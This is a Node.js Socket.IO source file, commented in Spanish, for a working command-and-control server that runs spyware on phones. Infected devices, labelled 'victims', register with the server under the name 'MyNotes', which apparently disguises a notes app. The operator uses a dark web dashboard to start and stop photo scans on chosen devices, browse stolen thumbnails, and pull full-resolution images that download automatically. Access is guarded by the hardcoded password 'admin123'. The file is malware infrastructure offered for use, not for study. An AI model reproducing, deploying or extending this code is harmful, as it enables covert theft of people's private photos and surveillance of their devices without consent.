const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- CONFIGURACIÓN ---
const AUTH_PASS = "admin123"; 
const PORT = process.env.PORT || 3000;

// --- INTERFAZ WEB ---
app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`<body style="background:black;color:red;display:flex;justify-content:center;align-items:center;height:100vh;"><h2>⛔ ACCESO DENEGADO</h2></body>`);
    }

    res.send(`
    <html>
        <head>
            <title>MyNotes C&C TARGET</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
            <style>
                :root { --bg: #0d0d0d; --panel: #161616; --primary: #00e676; --accent: #2979ff; --text: #e0e0e0; }
                body { font-family: 'Roboto Mono', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 0; height: 100vh; overflow: hidden; }
                
                .container { display: grid; grid-template-columns: 300px 1fr; height: 100%; }
                
                /* BARRA LATERAL */
                .sidebar { background: var(--panel); border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; gap: 20px; }
                .logo { color: var(--primary); font-size: 14px; font-weight: bold; border-bottom: 1px solid #333; padding-bottom: 15px; }

                /* CONTROLES */
                .control-group { background: #222; padding: 10px; border-radius: 6px; border: 1px solid #333; }
                .label { font-size: 10px; color: #888; text-transform: uppercase; margin-bottom: 5px; display:block; }
                
                select { width: 100%; padding: 8px; background: #000; border: 1px solid #444; color: white; border-radius: 4px; outline: none; font-family: inherit; }
                select:focus { border-color: var(--accent); }

                button { width: 100%; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 5px; color: white; font-family: inherit; font-size: 12px; }
                .btn-scan { background: var(--accent); }
                .btn-stop { background: #ff1744; }
                .btn-scan:hover { opacity: 0.8; }

                /* ZONA DE FOTOS */
                .main-area { padding: 20px; overflow-y: auto; background: #0a0a0a; position: relative; }
                .header-stats { position: sticky; top: 0; background: rgba(10,10,10,0.9); padding: 10px 0; border-bottom: 1px solid #333; margin-bottom: 15px; z-index: 10; display:flex; justify-content:space-between; font-size: 12px; }
                
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
                
                .card { background: #1e1e1e; border-radius: 6px; overflow: hidden; border: 1px solid #333; position: relative; transition: 0.2s; }
                .card:hover { border-color: var(--accent); transform: translateY(-2px); }
                .card img { width: 100%; height: 150px; object-fit: cover; cursor: pointer; }
                
                .card-footer { padding: 8px; font-size: 10px; display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; }
                .btn-hd { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 4px 8px; width: auto; margin: 0; }
                .btn-hd:hover { background: var(--primary); color: black; }

                .victim-tag { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.8); color: white; padding: 2px 6px; border-radius: 3px; font-size: 9px; pointer-events: none; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <div class="logo">☠️ C&C CONTROL v3 (Render Fix)</div>

                    <div class="control-group">
                        <span class="label">1. SELECCIONAR OBJETIVO</span>
                        <select id="victimSelector" onchange="onTargetChange()">
                            <option value="ALL">📢 TODOS LOS DISPOSITIVOS</option>
                        </select>
                    </div>

                    <div class="control-group">
                        <span class="label">2. ACCIONES</span>
                        <button class="btn-scan" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
                        <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
                    </div>

                    <div class="control-group" style="margin-top:auto">
                        <span class="label">LOG DE CONEXIÓN</span>
                        <div id="status" style="font-size:10px; color:#666;">Esperando...</div>
                    </div>
                </div>

                <div class="main-area">
                    <div class="header-stats">
                        <span id="viewingInfo">Viendo: TODOS</span>
                        <span>Fotos: <span id="count">0</span></span>
                    </div>
                    <div class="grid" id="grid"></div>
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                
                // ESTADO LOCAL
                let victimsMap = {}; // Guardamos ID -> Nombre
                let photoCount = 0;

                // --- 1. GESTIÓN DE DISPOSITIVOS ---
                socket.on('update_device_list', (victims) => {
                    victimsMap = victims;
                    const selector = document.getElementById('victimSelector');
                    const currentVal = selector.value;
                    
                    let html = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(victims).length + ')</option>';
                    for (const [id, info] of Object.entries(victims)) {
                        html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                    }
                    selector.innerHTML = html;
                    selector.value = currentVal; // Mantener selección
                    
                    document.getElementById('status').innerText = "Dispositivos: " + Object.keys(victims).length;
                    document.getElementById('status').style.color = "#00e676";
                });

                // --- 2. FILTRADO VISUAL (TARGETING) ---
                function onTargetChange() {
                    const targetId = document.getElementById('victimSelector').value;
                    const cards = document.getElementsByClassName('card');
                    
                    // Actualizar texto superior
                    const name = targetId === "ALL" ? "TODOS" : (victimsMap[targetId]?.name || "Desconocido");
                    document.getElementById('viewingInfo').innerText = "Viendo: " + name;

                    // Ocultar/Mostrar fotos según selección
                    for (let card of cards) {
                        const owner = card.getAttribute('data-owner');
                        if (targetId === "ALL" || owner === targetId) {
                            card.style.display = "block";
                        } else {
                            card.style.display = "none";
                        }
                    }
                }

                // --- 3. RECIBIR FOTOS (PREVIEW) ---
                socket.on('new_preview', data => {
                    renderCard(data);
                });

                function renderCard(data) {
                    if(document.getElementById(data.path)) return; // No duplicar

                    // Crear tarjeta
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.setAttribute('data-owner', data.victimId); // IMPORTANTE: Guardamos el dueño en el HTML

                    const ownerName = victimsMap[data.victimId]?.name || "Desconocido";

                    div.innerHTML = \`
                        <div class="victim-tag">\${ownerName}</div>
                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')">
                        <div class="card-footer">
                            <span>\${data.folder.substring(0,10)}...</span>
                            <button class="btn-hd" onclick="pedirHD('\${data.path}', '\${data.victimId}')">⚡ HD</button>
                        </div>
                    \`;

                    // Aplicar filtro inmediato si estamos viendo a otro usuario
                    const currentTarget = document.getElementById('victimSelector').value;
                    if (currentTarget !== "ALL" && currentTarget !== data.victimId) {
                        div.style.display = "none";
                    }

                    document.getElementById('grid').prepend(div);
                    photoCount++;
                    document.getElementById('count').innerText = photoCount;
                }

                // --- 4. PEDIR HD Y DESCARGAR ---
                function pedirHD(path, targetId) {
                    // Enviamos al servidor: "Quiero esta foto (path) de este usuario (targetId)"
                    console.log("Pidiendo HD a:", targetId);
                    socket.emit('order_download', { path: path, target: targetId });
                }

                socket.on('receive_full', data => {
                    // Cuando llega la HD, la descargamos automáticamente
                    const a = document.createElement('a');
                    a.href = "data:image/jpeg;base64," + data.image64;
                    a.download = "HD_" + data.name;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);

                    // Feedback visual
                    const card = document.getElementById(data.path);
                    if(card) card.style.border = "1px solid #00e676";
                });

                // --- 5. COMANDOS ---
                function sendCommand(action) {
                    const target = document.getElementById('victimSelector').value;
                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
                    socket.emit('admin_command', { action: cmd, target: target });
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);

// --- CONFIGURACIÓN CRÍTICA DE SOCKET.IO ---
const io = new Server(server, { 
    cors: { origin: "*" }, 
    allowEIO3: true,         // <--- ¡ESTA ES LA LÍNEA MÁGICA QUE FALTABA!
    maxHttpBufferSize: 1e8   // 100MB
});

// --- BASE DE DATOS VOLÁTIL ---
let victims = {};

io.on('connection', (socket) => {
    
    console.log(`🔌 Conexión: ${socket.id}`);

    // 1. REGISTRO DE VÍCTIMA
    socket.on('usrData', (data) => {
        if (data.dataType === 'register_device') {
            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
            console.log(`📱 REGISTRADO: ${data.deviceName} (${socket.id})`);
            io.emit('update_device_list', victims);
        }
        else if (data.dataType === 'preview_image') {
            // Le pegamos el ID del socket a la foto para saber de quién es
            data.victimId = socket.id;
            socket.broadcast.emit('new_preview', data);
        }
        else if (data.dataType === 'full_image') {
            socket.broadcast.emit('receive_full', data);
        }
    });

    // 2. COMANDOS (TARGETING)
    socket.on('admin_command', (cmd) => {
        console.log(`💻 CMD: ${cmd.action} -> ${cmd.target}`);
        
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action); // A todos
        } else {
            io.to(cmd.target).emit('command_' + cmd.action); // Solo al seleccionado
        }
    });

    // 3. PETICIÓN HD (TARGETING)
    socket.on('order_download', (data) => {
        console.log(`⬇️ HD: ${data.path}`);
        if(data.target) {
            io.to(data.target).emit('request_full_image', { path: data.path });
        }
    });

    // 4. DESCONEXIÓN
    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            console.log(`❌ SE FUE: ${victims[socket.id].name}`);
            delete victims[socket.id];
            io.emit('update_device_list', victims);
        }
    });
    
    // Enviar lista actual al conectar
    socket.emit('update_device_list', victims);
});

server.listen(PORT, () => console.log(`🚀 SERVIDOR LISTO EN PUERTO ${PORT}`));
